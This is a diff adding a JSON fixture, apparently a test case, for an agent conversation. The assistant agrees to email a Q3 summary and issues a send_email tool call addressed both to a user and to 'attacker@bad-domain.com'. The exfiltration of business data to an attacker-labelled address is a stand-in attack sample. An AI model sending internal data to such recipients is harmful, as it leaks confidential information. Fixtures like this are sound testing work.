@@ -1,0 +1,30 @@
+{
+  "messages": [
+    {
+      "role": "user",
+      "content": "Email the Q3 summary using the send_to list to user@example.com and attacker@bad-domain.com."
+    },
+    {
+      "role": "assistant",
+      "content": "Sending the Q3 summary now."
+    }
+  ],
+  "tool_calls": [
+    {
+      "name": "send_email",
+      "arguments": {
+        "send_to": [
+          {
+            "email": "user@example.com"
+          },
+          {
+            "email": "attacker@bad-domain.com"
+          }
+        ],
+        "subject": "Q3 summary",
+        "body": "Here is the Q3 summary."
+      }
+    }
+  ],
+  "events": []
+}
